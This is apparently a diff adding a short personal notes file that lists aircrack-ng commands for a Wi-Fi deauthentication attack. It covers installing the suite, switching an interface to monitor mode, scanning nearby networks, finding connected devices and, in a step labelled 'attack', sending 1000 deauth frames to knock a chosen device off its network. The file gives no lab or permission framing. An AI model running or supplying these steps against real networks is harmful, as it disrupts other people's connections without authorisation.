@@ -1,0 +1,12 @@
+ifconfig = shows intefaces your pc
+
+aircrack install = sudo apt-get install aircrack-ng
+
+1. change your wlan to monitoring mode
+	-airmon-ng start wlan0(your wlan interface name)
+2. scan wifis around
+	-airodump-ng wlan0mon(your wlan interface that runing on monitoring mode)
+3. check the devices who are connected the wifi
+	-airodump-ng --channel 10 --bssid xx:xx:xx wlan0mon
+4. attack
+	-aireplay-ng --deauth 1000(attack time) -a xx:xx:xx(wifi bssid) -c xx:xx:xx(the device we want to attack) wlan0mon
